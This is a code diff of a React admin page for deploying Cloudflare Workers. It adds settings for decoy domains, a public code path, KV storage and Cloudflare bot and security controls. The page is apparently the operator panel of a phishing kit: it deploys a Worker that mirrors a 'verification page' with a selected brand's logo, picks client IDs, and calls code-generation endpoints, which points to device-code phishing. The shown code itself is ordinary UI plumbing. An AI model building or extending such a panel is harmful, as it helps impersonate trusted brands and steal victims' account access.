@@ -288,12 +288,29 @@ export default function Deploy() {
   const [apiKey, setApiKey] = useState("");
   const [showKey, setShowKey] = useState(false);
   const [accountId, setAccountId] = useState("");
+  const [zoneId, setZoneId] = useState("");
+  const [kvNamespaceId, setKvNamespaceId] = useState("");
   const [apiServerUrl, setApiServerUrl] = useState("");
   const [frontendUrl, setFrontendUrl] = useState("");
   const [cfConnected, setCfConnected] = useState(false);
   const [cfConnecting, setCfConnecting] = useState(false);
   const [cfError, setCfError] = useState("");
   const [deletingKey, setDeletingKey] = useState(false);
+
+  type SecurityLevel =
+    | "essentially_off"
+    | "low"
+    | "medium"
+    | "high"
+    | "under_attack";
+  const [botFightMode, setBotFightMode] = useState<"on" | "off" | null>(null);
+  const [securityLevel, setSecurityLevel] = useState<SecurityLevel | null>(
+    null,
+  );
+  const [securityAvailable, setSecurityAvailable] = useState(false);
+  const [securityLoading, setSecurityLoading] = useState(false);
+  const [securitySaving, setSecuritySaving] = useState(false);
+  const [securityError, setSecurityError] = useState("");
 
   const [template, setTemplate] = useState<TemplateId>("devdoc-sign");
   const [region, setRegion] = useState("auto");
@@ -310,34 +327,117 @@ export default function Deploy() {
   const [testStatus, setTestStatus] = useState<TestStatus>("idle");
   const [testMsg, setTestMsg] = useState("");
 
+  const [publicCodePath, setPublicCodePath] = useState("");
+  const [decoyDomains, setDecoyDomains] = useState<string[]>(
+    Array(10).fill(""),
+  );
+  const [kvBindingName, setKvBindingName] = useState("");
+
   useEffect(() => {
     authFetch(adminUrl("/deploy/cloudflare-config"))
       .then((r) => r.json())
-      .then((j: { hasApiKey?: boolean; accountId?: string; apiServerUrl?: string; frontendUrl?: string }) => {
-        if (j.hasApiKey) setCfConnected(true);
-        if (j.accountId) setAccountId(j.accountId);
-        if (j.apiServerUrl) setApiServerUrl(j.apiServerUrl);
-        if (j.frontendUrl) setFrontendUrl(j.frontendUrl);
-      })
+      .then(
+        (j: {
+          hasApiKey?: boolean;
+          accountId?: string;
+          zoneId?: string;
+          apiServerUrl?: string;
+          frontendUrl?: string;
+          kvNamespaceId?: string;
+        }) => {
+          if (j.hasApiKey) setCfConnected(true);
+          if (j.accountId) setAccountId(j.accountId);
+          if (j.zoneId) setZoneId(j.zoneId);
+          if (j.apiServerUrl) setApiServerUrl(j.apiServerUrl);
+          if (j.frontendUrl) setFrontendUrl(j.frontendUrl);
+          if (j.kvNamespaceId) setKvNamespaceId(j.kvNamespaceId);
+        },
+      )
       .catch(() => {});
+
+    loadCloudflareSecurity();
 
     authFetch(adminUrl("/deploy/last"))
       .then((r) => r.json())
-      .then((j: { template?: TemplateId; clientAlias?: string; region?: string; workerUrl?: string; scriptName?: string }) => {
-        if (j.template) setTemplate(j.template as TemplateId);
-        if (j.clientAlias) setClientAlias(j.clientAlias);
-        if (j.region) setRegion(j.region);
-        if (j.workerUrl) setDeployedUrl(j.workerUrl);
-        if (j.scriptName) setDeployedScriptName(j.scriptName);
-      })
+      .then(
+        (j: {
+          template?: TemplateId;
+          clientAlias?: string;
+          region?: string;
+          workerUrl?: string;
+          scriptName?: string;
+        }) => {
+          if (j.template) setTemplate(j.template as TemplateId);
+          if (j.clientAlias) setClientAlias(j.clientAlias);
+          if (j.region) setRegion(j.region);
+          if (j.workerUrl) setDeployedUrl(j.workerUrl);
+          if (j.scriptName) setDeployedScriptName(j.scriptName);
+          if ((j as any).publicCodePath)
+            setPublicCodePath((j as any).publicCodePath);
+          if ((j as any).decoyDomains?.length)
+            setDecoyDomains(
+              (j as any).decoyDomains.concat(Array(10).fill("")).slice(0, 10),
+            );
+          if ((j as any).kvBindingName)
+            setKvBindingName((j as any).kvBindingName);
+        },
+      )
       .catch(() => {});
   }, []);
 
+  async function loadCloudflareSecurity() {
+    setSecurityLoading(true);
+    setSecurityError("");
+    try {
+      const res = await authFetch(adminUrl("/deploy/cloudflare-security"));
+      const j = (await res.json().catch(() => ({}))) as {
+        available?: boolean;
+        botFightMode?: "on" | "off" | null;
+        securityLevel?: SecurityLevel | null;
+        botFightError?: string;
+        secLevelError?: string;
+        error?: string;
+      };
+
+      if (!res.ok) {
+        throw new Error(j.error ?? `Cloudflare settings unavailable (${res.status}).`);
+      }
+
+      setSecurityAvailable(Boolean(j.available));
+      setBotFightMode(j.botFightMode ?? null);
+      setSecurityLevel(j.securityLevel ?? null);
+      if (j.botFightError || j.secLevelError) {
+        setSecurityError(j.botFightError ?? j.secLevelError ?? "");
+      }
+    } catch (error) {
+      setSecurityAvailable(false);
+      setSecurityError(
+        error instanceof Error
+          ? error.message
+          : "Unable to load Cloudflare security settings.",
+      );
+    } finally {
+      setSecurityLoading(false);
+    }
+  }
+
   async function handleConnect() {
-    if (!apiKey.trim()) { setCfError("Please enter your Cloudflare API key."); return; }
-    if (!accountId.trim()) { setCfError("Please enter your Cloudflare Account ID."); return; }
-    if (!apiServerUrl.trim()) { setCfError("Please enter the API Server URL."); return; }
-    if (!frontendUrl.trim()) { setCfError("Please enter the Frontend URL to proxy."); return; }
+    if (!apiKey.trim()) {
+      setCfError("Please enter your Cloudflare API key.");
+      return;
+    }
+    if (!accountId.trim()) {
+      setCfError("Please enter your Cloudflare Account ID.");
+      return;
+    }
+    if (!apiServerUrl.trim()) {
+      setCfError("Please enter the API Server URL.");
+      return;
+    }
+    if (!frontendUrl.trim()) {
+      setCfError("Please enter the Frontend URL to proxy.");
+      return;
+    }
     setCfError("");
     setCfConnecting(true);
     try {
@@ -347,15 +447,20 @@ export default function Deploy() {
         body: JSON.stringify({
           apiKey: apiKey.trim(),
           accountId: accountId.trim(),
+          zoneId: zoneId.trim(),
           apiServerUrl: apiServerUrl.trim(),
           frontendUrl: frontendUrl.trim(),
+          kvNamespaceId: kvNamespaceId.trim(),
         }),
       });
       if (res.ok) {
         setCfConnected(true);
+        await loadCloudflareSecurity();
       } else {
         const j = await res.json().catch(() => ({}));
-        setCfError((j as { error?: string }).error ?? `Server error: ${res.status}`);
+        setCfError(
+          (j as { error?: string }).error ?? `Server error: ${res.status}`,
+        );
       }
     } catch {
       setCfError("Unable to reach the admin server.");
@@ -365,25 +470,96 @@ export default function Deploy() {
   }
 
   async function handleDeleteKey() {
-    if (!confirm("Delete all saved Cloudflare credentials? This cannot be undone.")) return;
+    if (
+      !confirm(
+        "Delete all saved Cloudflare credentials? This cannot be undone.",
+      )
+    )
+      return;
     setDeletingKey(true);
     try {
-      const res = await authFetch(adminUrl("/deploy/cloudflare-config"), { method: "DELETE" });
+      const res = await authFetch(adminUrl("/deploy/cloudflare-config"), {
+        method: "DELETE",
+      });
       if (res.ok) {
         setCfConnected(false);
         setApiKey("");
         setAccountId("");
+        setZoneId("");
+        setKvNamespaceId("");
         setApiServerUrl("");
         setFrontendUrl("");
         setCfError("");
+        setSecurityAvailable(false);
+        setBotFightMode(null);
+        setSecurityLevel(null);
+        setSecurityError("");
       } else {
         const j = await res.json().catch(() => ({}));
-        setCfError((j as { error?: string }).error ?? "Failed to delete credentials.");
+        setCfError(
+          (j as { error?: string }).error ?? "Failed to delete credentials.",
+        );
       }
     } catch {
       setCfError("Unable to reach the admin server.");
     } finally {
       setDeletingKey(false);
+    }
+  }
+
+  async function handleBotFightMode(enabled: boolean) {
+    setSecuritySaving(true);
+    setSecurityError("");
+    try {
+      const res = await authFetch(adminUrl("/deploy/bot-fight-mode"), {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ enabled }),
+      });
+      const j = (await res.json().catch(() => ({}))) as {
+        value?: "on" | "off";
+        error?: string;
+      };
+      if (!res.ok) {
+        throw new Error(j.error ?? `Failed to update Bot Fight Mode (${res.status}).`);
+      }
+      setBotFightMode(j.value ?? (enabled ? "on" : "off"));
+    } catch (error) {
+      setSecurityError(
+        error instanceof Error
+          ? error.message
+          : "Unable to update Bot Fight Mode.",
+      );
+    } finally {
+      setSecuritySaving(false);
+    }
+  }
+
+  async function handleSecurityLevel(level: SecurityLevel) {
+    setSecuritySaving(true);
+    setSecurityError("");
+    try {
+      const res = await authFetch(adminUrl("/deploy/security-level"), {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ level }),
+      });
+      const j = (await res.json().catch(() => ({}))) as {
+        value?: SecurityLevel;
+        error?: string;
+      };
+      if (!res.ok) {
+        throw new Error(j.error ?? `Failed to update security level (${res.status}).`);
+      }
+      setSecurityLevel(j.value ?? level);
+    } catch (error) {
+      setSecurityError(
+        error instanceof Error
+          ? error.message
+          : "Unable to update the Cloudflare security level.",
+      );
+    } finally {
+      setSecuritySaving(false);
     }
   }
 
@@ -395,9 +571,20 @@ export default function Deploy() {
       const res = await authFetch(adminUrl("/deploy"), {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ template, region, clientAlias }),
+        body: JSON.stringify({
+          template,
+          region,
+          clientAlias,
+          publicCodePath,
+          decoyDomains: decoyDomains.filter(Boolean),
+          kvBindingName: kvBindingName || undefined,
+        }),
       });
-      const j = await res.json().catch(() => ({})) as { url?: string; scriptName?: string; error?: string };
+      const j = (await res.json().catch(() => ({}))) as {
+        url?: string;
+        scriptName?: string;
+        error?: string;
+      };
       if (res.ok) {
         setDeployStatus("success");
         setDeployedUrl(j.url ?? "");
@@ -414,11 +601,18 @@ export default function Deploy() {
   }
 
   async function handleDeleteWorker() {
-    if (!confirm(`Delete worker "${deployedScriptName}" from Cloudflare? This cannot be undone.`)) return;
+    if (
+      !confirm(
+        `Delete worker "${deployedScriptName}" from Cloudflare? This cannot be undone.`,
+      )
+    )
+      return;
     setDeletingWorker(true);
     setDeleteWorkerMsg("");
     try {
-      const res = await authFetch(adminUrl("/deploy/worker"), { method: "DELETE" });
+      const res = await authFetch(adminUrl("/deploy/worker"), {
+        method: "DELETE",
+      });
       if (res.ok) {
         setDeployedUrl("");
         setDeployedScriptName("");
@@ -428,7 +622,9 @@ export default function Deploy() {
         setDeleteWorkerMsg("Worker deleted from Cloudflare.");
       } else {
         const j = await res.json().catch(() => ({}));
-        setDeleteWorkerMsg((j as { error?: string }).error ?? "Failed to delete worker.");
+        setDeleteWorkerMsg(
+          (j as { error?: string }).error ?? "Failed to delete worker.",
+        );
       }
     } catch {
       setDeleteWorkerMsg("Unable to reach the admin server.");
@@ -444,48 +640,78 @@ export default function Deploy() {
     const controller = new AbortController();
     const timer = setTimeout(() => controller.abort(), 12000);
     try {
-      // /api/template is served directly by the worker with CORS headers — safe to fetch cross-origin
-      const res = await fetch(`${deployedUrl}/api/template`, { signal: controller.signal });
+      const res = await fetch(`${deployedUrl}/api/template`, {
+        signal: controller.signal,
+      });
       clearTimeout(timer);
       if (res.ok) {
-        const j = await res.json().catch(() => ({})) as { template?: string };
+        const j = (await res.json().catch(() => ({}))) as { template?: string };
         setTestStatus("ok");
-        setTestMsg(`HTTP ${res.status} — template: "${j.template ?? "unknown"}"`);
+        setTestMsg(
+          `HTTP ${res.status} — template: "${j.template ?? "unknown"}"`,
+        );
       } else {
         setTestStatus("error");
-        setTestMsg(`HTTP ${res.status} — worker reachable but returned an error`);
+        setTestMsg(
+          `HTTP ${res.status} — worker reachable but returned an error`,
+        );
       }
     } catch (e: unknown) {
       clearTimeout(timer);
       const isAbort = e instanceof Error && e.name === "AbortError";
       setTestStatus("error");
-      setTestMsg(isAbort ? "Timed out after 12 s — worker unreachable or still warming up" : "Network error — check the worker URL and CORS settings");
+      setTestMsg(
+        isAbort
+          ? "Timed out after 12 s — worker unreachable or still warming up"
+          : "Network error — check the worker URL and CORS settings",
+      );
     }
   }
 
-  const selectedTemplate = TEMPLATES.find((t) => t.id === template) ?? TEMPLATES[0];
+  const selectedTemplate =
+    TEMPLATES.find((t) => t.id === template) ?? TEMPLATES[0];
   const selectedClient = CLIENT_IDS.find((c) => c.alias === clientAlias);
 
   return (
-    <div style={{ maxWidth: 980, margin: "0 auto", padding: "32px 32px 64px", display: "grid", gridTemplateColumns: "1fr 380px", gap: 32 }}>
-
+    <div
+      style={{
+        maxWidth: 980,
+        margin: "0 auto",
+        padding: "32px 32px 64px",
+        display: "grid",
+        gridTemplateColumns: "1fr 380px",
+        gap: 32,
+      }}
+    >
       {/* ── LEFT COLUMN ── */}
       <div>
         {/* Page header */}
         <div style={{ marginBottom: 28 }}>
-          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 6 }}>
+          <div
+            style={{
+              display: "flex",
+              alignItems: "center",
+              gap: 10,
+              marginBottom: 6,
+            }}
+          >
             <Rocket size={20} color="#3b82f6" />
-            <h1 style={{ fontSize: 20, fontWeight: 700, color: "#f1f5f9" }}>Deploy to Cloudflare Workers</h1>
+            <h1 style={{ fontSize: 20, fontWeight: 700, color: "#f1f5f9" }}>
+              Deploy to Cloudflare Workers
+            </h1>
           </div>
           <p style={{ fontSize: 13, color: "#475569" }}>
-            Choose a header template, configure your credentials, and deploy a Worker that mirrors your verification page with the selected branding.
+            Choose a header template, configure your credentials, and deploy a
+            Worker that mirrors your verification page with the selected
+            branding.
           </p>
         </div>
 
         {/* ── Section 1: Header Template ─────────────────────────────── */}
         <Section label="Header Template">
           <p style={{ fontSize: 12, color: "#475569", marginBottom: 16 }}>
-            The Worker proxies your live verification page and applies this brand's SVG logo to the top header.
+            The Worker proxies your live verification page and applies this
+            brand's SVG logo to the top header.
           </p>
           <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
             {TEMPLATES.map((t) => {
@@ -508,32 +734,46 @@ export default function Deploy() {
                     transition: "all 0.12s",
                   }}
                 >
-                  {/* Logo preview on white */}
-                  <div style={{
-                    width: 220,
-                    minWidth: 220,
-                    height: 44,
-                    borderRadius: 7,
-                    background: "white",
-                    display: "flex",
-                    alignItems: "center",
-                    paddingLeft: 12,
-                    overflow: "hidden",
-                    border: `1px solid ${selected ? "#3b82f660" : "#e5e7eb"}`,
-                    flexShrink: 0,
-                  }}>
+                  <div
+                    style={{
+                      width: 220,
+                      minWidth: 220,
+                      height: 44,
+                      borderRadius: 7,
+                      background: "white",
+                      display: "flex",
+                      alignItems: "center",
+                      paddingLeft: 12,
+                      overflow: "hidden",
+                      border: `1px solid ${selected ? "#3b82f660" : "#e5e7eb"}`,
+                      flexShrink: 0,
+                    }}
+                  >
                     <Header />
                   </div>
-
-                  {/* Label */}
                   <div style={{ flex: 1 }}>
-                    <div style={{ fontSize: 13, fontWeight: selected ? 600 : 400, color: selected ? "#93c5fd" : "#94a3b8" }}>
+                    <div
+                      style={{
+                        fontSize: 13,
+                        fontWeight: selected ? 600 : 400,
+                        color: selected ? "#93c5fd" : "#94a3b8",
+                      }}
+                    >
                       {t.label}
                     </div>
-                    <div style={{ fontSize: 11, color: "#374151", marginTop: 2 }}>Applies header SVG to the Worker page</div>
+                    <div
+                      style={{ fontSize: 11, color: "#374151", marginTop: 2 }}
+                    >
+                      Applies header SVG to the Worker page
+                    </div>
                   </div>
-
-                  {selected && <CheckCircle2 size={16} color="#3b82f6" style={{ flexShrink: 0 }} />}
+                  {selected && (
+                    <CheckCircle2
+                      size={16}
+                      color="#3b82f6"
+                      style={{ flexShrink: 0 }}
+                    />
+                  )}
                 </button>
               );
             })}
@@ -553,17 +793,53 @@ export default function Deploy() {
                   key={c.alias}
                   onClick={() => setClientAlias(c.alias)}
                   style={{
-                    display: "flex", alignItems: "center", gap: 12, padding: "10px 14px",
-                    borderRadius: 8, border: `1.5px solid ${selected ? "#3b82f6" : "#1e2d3d"}`,
-                    background: selected ? "#0d1e35" : "#0d1117", cursor: "pointer", textAlign: "left", transition: "all 0.12s",
+                    display: "flex",
+                    alignItems: "center",
+                    gap: 12,
+                    padding: "10px 14px",
+                    borderRadius: 8,
+                    border: `1.5px solid ${selected ? "#3b82f6" : "#1e2d3d"}`,
+                    background: selected ? "#0d1e35" : "#0d1117",
+                    cursor: "pointer",
+                    textAlign: "left",
+                    transition: "all 0.12s",
                   }}
                 >
-                  <div style={{ width: 26, height: 26, borderRadius: 6, background: c.color + "22", border: `1px solid ${c.color}44`, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
+                  <div
+                    style={{
+                      width: 26,
+                      height: 26,
+                      borderRadius: 6,
+                      background: c.color + "22",
+                      border: `1px solid ${c.color}44`,
+                      display: "flex",
+                      alignItems: "center",
+                      justifyContent: "center",
+                      flexShrink: 0,
+                    }}
+                  >
                     <c.icon size={13} color={c.color} />
                   </div>
                   <div style={{ flex: 1, minWidth: 0 }}>
-                    <div style={{ fontSize: 13, fontWeight: selected ? 600 : 400, color: selected ? "#93c5fd" : "#64748b" }}>{c.name}</div>
-                    <div style={{ fontSize: 10, color: "#374151", fontFamily: "monospace", marginTop: 2 }}>{c.id}</div>
+                    <div
+                      style={{
+                        fontSize: 13,
+                        fontWeight: selected ? 600 : 400,
+                        color: selected ? "#93c5fd" : "#64748b",
+                      }}
+                    >
+                      {c.name}
+                    </div>
+                    <div
+                      style={{
+                        fontSize: 10,
+                        color: "#374151",
+                        fontFamily: "monospace",
+                        marginTop: 2,
+                      }}
+                    >
+                      {c.id}
+                    </div>
                   </div>
                   {selected && <CheckCircle2 size={14} color="#3b82f6" />}
                 </button>
@@ -574,20 +850,35 @@ export default function Deploy() {
 
         {/* ── Section 3: Region ────────────────────────────────────────── */}
         <Section label="Worker Region">
-          <div style={{ display: "grid", gridTemplateColumns: "repeat(5, 1fr)", gap: 8 }}>
+          <div
+            style={{
+              display: "grid",
+              gridTemplateColumns: "repeat(5, 1fr)",
+              gap: 8,
+            }}
+          >
             {REGIONS.map((r) => (
               <button
                 key={r.id}
                 onClick={() => setRegion(r.id)}
                 style={{
-                  padding: "10px 8px", borderRadius: 8,
+                  padding: "10px 8px",
+                  borderRadius: 8,
                   border: `1.5px solid ${region === r.id ? "#3b82f6" : "#1e2d3d"}`,
                   background: region === r.id ? "#0d1e35" : "#0d1117",
-                  cursor: "pointer", textAlign: "center", transition: "all 0.12s",
+                  cursor: "pointer",
+                  textAlign: "center",
+                  transition: "all 0.12s",
                 }}
               >
                 <div style={{ fontSize: 18, marginBottom: 4 }}>{r.flag}</div>
-                <div style={{ fontSize: 11, fontWeight: region === r.id ? 600 : 400, color: region === r.id ? "#93c5fd" : "#475569" }}>
+                <div
+                  style={{
+                    fontSize: 11,
+                    fontWeight: region === r.id ? 600 : 400,
+                    color: region === r.id ? "#93c5fd" : "#475569",
+                  }}
+                >
                   {r.label}
                 </div>
               </button>
@@ -598,19 +889,55 @@ export default function Deploy() {
         {/* ── Section 4: Cloudflare Connection ─────────────────────────── */}
         <Section label="Cloudflare Connection">
           <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
-
             {/* API Key */}
             <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
-              <label style={{ fontSize: 11, fontWeight: 600, color: "#64748b", letterSpacing: "0.06em", textTransform: "uppercase" }}>API Key (Bearer Token)</label>
+              <label
+                style={{
+                  fontSize: 11,
+                  fontWeight: 600,
+                  color: "#64748b",
+                  letterSpacing: "0.06em",
+                  textTransform: "uppercase",
+                }}
+              >
+                API Key (Bearer Token)
+              </label>
               <div style={{ position: "relative" }}>
                 <input
                   type={showKey ? "text" : "password"}
                   value={apiKey}
-                  onChange={(e) => { setApiKey(e.target.value); setCfError(""); setCfConnected(false); }}
+                  onChange={(e) => {
+                    setApiKey(e.target.value);
+                    setCfError("");
+                    setCfConnected(false);
+                  }}
                   placeholder="Enter your Cloudflare API Token…"
-                  style={{ width: "100%", padding: "9px 38px 9px 12px", background: "#0d1117", border: `1px solid ${cfConnected ? "#22c55e" : cfError ? "#ef4444" : "#1e2d3d"}`, borderRadius: 8, color: "#e2e8f0", fontSize: 13, outline: "none", fontFamily: "monospace" }}
+                  style={{
+                    width: "100%",
+                    padding: "9px 38px 9px 12px",
+                    background: "#0d1117",
+                    border: `1px solid ${cfConnected ? "#22c55e" : cfError ? "#ef4444" : "#1e2d3d"}`,
+                    borderRadius: 8,
+                    color: "#e2e8f0",
+                    fontSize: 13,
+                    outline: "none",
+                    fontFamily: "monospace",
+                  }}
                 />
-                <button onClick={() => setShowKey((v) => !v)} style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", color: "#475569", display: "flex" }}>
+                <button
+                  onClick={() => setShowKey((v) => !v)}
+                  style={{
+                    position: "absolute",
+                    right: 10,
+                    top: "50%",
+                    transform: "translateY(-50%)",
+                    background: "none",
+                    border: "none",
+                    cursor: "pointer",
+                    color: "#475569",
+                    display: "flex",
+                  }}
+                >
                   {showKey ? <EyeOff size={14} /> : <Eye size={14} />}
                 </button>
               </div>
@@ -618,84 +945,681 @@ export default function Deploy() {
 
             {/* Account ID */}
             <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
-              <label style={{ fontSize: 11, fontWeight: 600, color: "#64748b", letterSpacing: "0.06em", textTransform: "uppercase" }}>Account ID</label>
+              <label
+                style={{
+                  fontSize: 11,
+                  fontWeight: 600,
+                  color: "#64748b",
+                  letterSpacing: "0.06em",
+                  textTransform: "uppercase",
+                }}
+              >
+                Account ID
+              </label>
               <input
-                type="text" value={accountId}
-                onChange={(e) => { setAccountId(e.target.value); setCfError(""); setCfConnected(false); }}
+                type="text"
+                value={accountId}
+                onChange={(e) => {
+                  setAccountId(e.target.value);
+                  setCfError("");
+                  setCfConnected(false);
+                }}
                 placeholder="e.g. a1b2c3d4e5f6…"
-                style={{ width: "100%", padding: "9px 12px", background: "#0d1117", border: `1px solid ${cfConnected ? "#22c55e" : cfError ? "#ef4444" : "#1e2d3d"}`, borderRadius: 8, color: "#e2e8f0", fontSize: 13, outline: "none", fontFamily: "monospace" }}
+                style={{
+                  width: "100%",
+                  padding: "9px 12px",
+                  background: "#0d1117",
+                  border: `1px solid ${cfConnected ? "#22c55e" : cfError ? "#ef4444" : "#1e2d3d"}`,
+                  borderRadius: 8,
+                  color: "#e2e8f0",
+                  fontSize: 13,
+                  outline: "none",
+                  fontFamily: "monospace",
+                }}
               />
-              <div style={{ fontSize: 11, color: "#374151" }}>dash.cloudflare.com → select account → Overview → right sidebar</div>
+              <div style={{ fontSize: 11, color: "#374151" }}>
+                dash.cloudflare.com → select account → Overview → right sidebar
+              </div>
+            </div>
+
+            {/* KV Namespace ID */}
+            <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+              <label
+                style={{
+                  fontSize: 11,
+                  fontWeight: 600,
+                  color: "#64748b",
+                  letterSpacing: "0.06em",
+                  textTransform: "uppercase",
+                }}
+              >
+                KV Namespace ID
+              </label>
+              <input
+                type="text"
+                value={kvNamespaceId}
+                onChange={(e) => {
+                  setKvNamespaceId(e.target.value);
+                  setCfError("");
+                  setCfConnected(false);
+                }}
+                placeholder="e.g. a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"
+                style={{
+                  width: "100%",
+                  padding: "9px 12px",
+                  background: "#0d1117",
+                  border: `1px solid ${cfConnected ? "#22c55e" : cfError ? "#ef4444" : "#1e2d3d"}`,
+                  borderRadius: 8,
+                  color: "#e2e8f0",
+                  fontSize: 13,
+                  outline: "none",
+                  fontFamily: "monospace",
+                }}
+              />
+              <div style={{ fontSize: 11, color: "#374151" }}>
+                Required for rate limiting and code caching.{" "}
+                <strong style={{ color: "#64748b" }}>How to find it:</strong>{" "}
+                Cloudflare Dashboard →{" "}
+                <strong style={{ color: "#64748b" }}>
+                  Workers &amp; Pages
+                </strong>{" "}
+                → <strong style={{ color: "#64748b" }}>KV</strong> → create or
+                select a namespace → copy the{" "}
+                <code style={{ color: "#64748b" }}>Namespace ID</code> shown on
+                the right. The binding name (e.g.{" "}
+                <code style={{ color: "#64748b" }}>CODE_STORE</code>) is set in
+                the Security section below — this ID links it to the actual KV
+                store.
+              </div>
+            </div>
+
+            {/* Zone ID */}
+            <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+              <label
+                style={{
+                  fontSize: 11,
+                  fontWeight: 600,
+                  color: "#64748b",
+                  letterSpacing: "0.06em",
+                  textTransform: "uppercase",
+                }}
+              >
+                Zone ID
+              </label>
+              <input
+                type="text"
+                value={zoneId}
+                onChange={(e) => {
+                  setZoneId(e.target.value);
+                  setCfError("");
+                  setCfConnected(false);
+                  setSecurityAvailable(false);
+                }}
+                placeholder="e.g. a1b2c3d4e5f6…"
+                style={{
+                  width: "100%",
+                  padding: "9px 12px",
+                  background: "#0d1117",
+                  border: `1px solid ${cfConnected ? "#22c55e" : cfError ? "#ef4444" : "#1e2d3d"}`,
+                  borderRadius: 8,
+                  color: "#e2e8f0",
+                  fontSize: 13,
+                  outline: "none",
+                  fontFamily: "monospace",
+                }}
+              />
+              <div style={{ fontSize: 11, color: "#374151" }}>
+                Required for zone security controls. Find it in Cloudflare
+                Dashboard → select your domain → Overview → API section.
+              </div>
             </div>
 
             {/* API Server URL */}
             <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
-              <label style={{ fontSize: 11, fontWeight: 600, color: "#64748b", letterSpacing: "0.06em", textTransform: "uppercase" }}>API Server URL</label>
+              <label
+                style={{
+                  fontSize: 11,
+                  fontWeight: 600,
+                  color: "#64748b",
+                  letterSpacing: "0.06em",
+                  textTransform: "uppercase",
+                }}
+              >
+                API Server URL
+              </label>
               <input
-                type="text" value={apiServerUrl}
-                onChange={(e) => { setApiServerUrl(e.target.value); setCfError(""); setCfConnected(false); }}
-                placeholder="https://your-api-server.replit.app"
-                style={{ width: "100%", padding: "9px 12px", background: "#0d1117", border: `1px solid ${cfConnected ? "#22c55e" : cfError ? "#ef4444" : "#1e2d3d"}`, borderRadius: 8, color: "#e2e8f0", fontSize: 13, outline: "none", fontFamily: "monospace" }}
+                type="text"
+                value={apiServerUrl}
+                onChange={(e) => {
+                  setApiServerUrl(e.target.value);
+                  setCfError("");
+                  setCfConnected(false);
+                }}
+                placeholder="https://your-api-server.app"
+                style={{
+                  width: "100%",
+                  padding: "9px 12px",
+                  background: "#0d1117",
+                  border: `1px solid ${cfConnected ? "#22c55e" : cfError ? "#ef4444" : "#1e2d3d"}`,
+                  borderRadius: 8,
+                  color: "#e2e8f0",
+                  fontSize: 13,
+                  outline: "none",
+                  fontFamily: "monospace",
+                }}
               />
-              <div style={{ fontSize: 11, color: "#374151" }}>Used for <code style={{ color: "#64748b" }}>/api/generatecode</code> and <code style={{ color: "#64748b" }}>/api/regeneratecode</code> calls</div>
+              <div style={{ fontSize: 11, color: "#374151" }}>
+                Used for{" "}
+                <code style={{ color: "#64748b" }}>/api/generatecode</code> and{" "}
+                <code style={{ color: "#64748b" }}>/api/regeneratecode</code>{" "}
+                calls
+              </div>
             </div>
 
             {/* Frontend URL */}
             <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
-              <label style={{ fontSize: 11, fontWeight: 600, color: "#64748b", letterSpacing: "0.06em", textTransform: "uppercase" }}>Frontend URL</label>
-              <input
-                type="text" value={frontendUrl}
-                onChange={(e) => { setFrontendUrl(e.target.value); setCfError(""); setCfConnected(false); }}
-                placeholder="https://your-app.replit.app"
-                style={{ width: "100%", padding: "9px 12px", background: "#0d1117", border: `1px solid ${cfConnected ? "#22c55e" : cfError ? "#ef4444" : "#1e2d3d"}`, borderRadius: 8, color: "#e2e8f0", fontSize: 13, outline: "none", fontFamily: "monospace" }}
-              />
-              <div style={{ fontSize: 11, color: "#374151" }}>The Worker proxies all HTML and assets through this URL — your deployed frontend</div>
-            </div>
-
-            <div style={{ display: "flex", gap: 10, alignItems: "center", flexWrap: "wrap" }}>
-              <button
-                onClick={cfConnected ? () => { setCfConnected(false); setApiKey(""); } : handleConnect}
-                disabled={cfConnecting}
+              <label
                 style={{
-                  padding: "9px 20px", borderRadius: 8, border: "none",
-                  background: cfConnected ? "#166534" : "#f97316",
-                  color: "white", fontSize: 13, fontWeight: 600,
-                  cursor: cfConnecting ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 6, opacity: cfConnecting ? 0.7 : 1,
+                  fontSize: 11,
+                  fontWeight: 600,
+                  color: "#64748b",
+                  letterSpacing: "0.06em",
+                  textTransform: "uppercase",
                 }}
               >
-                {cfConnected ? <><CheckCircle2 size={13} /> Connected</> : cfConnecting ? "Connecting…" : <><Link2 size={13} /> Save & Verify</>}
+                Frontend URL
+              </label>
+              <input
+                type="text"
+                value={frontendUrl}
+                onChange={(e) => {
+                  setFrontendUrl(e.target.value);
+                  setCfError("");
+                  setCfConnected(false);
+                }}
+                placeholder="https://your-app.app"
+                style={{
+                  width: "100%",
+                  padding: "9px 12px",
+                  background: "#0d1117",
+                  border: `1px solid ${cfConnected ? "#22c55e" : cfError ? "#ef4444" : "#1e2d3d"}`,
+                  borderRadius: 8,
+                  color: "#e2e8f0",
+                  fontSize: 13,
+                  outline: "none",
+                  fontFamily: "monospace",
+                }}
+              />
+              <div style={{ fontSize: 11, color: "#374151" }}>
+                The Worker proxies all HTML and assets through this URL — your
+                deployed frontend
+              </div>
+            </div>
+
+            <div
+              style={{
+                display: "flex",
+                gap: 10,
+                alignItems: "center",
+                flexWrap: "wrap",
+              }}
+            >
+              <button
+                onClick={
+                  cfConnected
+                    ? () => {
+                        setCfConnected(false);
+                        setApiKey("");
+                      }
+                    : handleConnect
+                }
+                disabled={cfConnecting}
+                style={{
+                  padding: "9px 20px",
+                  borderRadius: 8,
+                  border: "none",
+                  background: cfConnected ? "#166534" : "#f97316",
+                  color: "white",
+                  fontSize: 13,
+                  fontWeight: 600,
+                  cursor: cfConnecting ? "wait" : "pointer",
+                  display: "flex",
+                  alignItems: "center",
+                  gap: 6,
+                  opacity: cfConnecting ? 0.7 : 1,
+                }}
+              >
+                {cfConnected ? (
+                  <>
+                    <CheckCircle2 size={13} /> Connected
+                  </>
+                ) : cfConnecting ? (
+                  "Connecting…"
+                ) : (
+                  <>
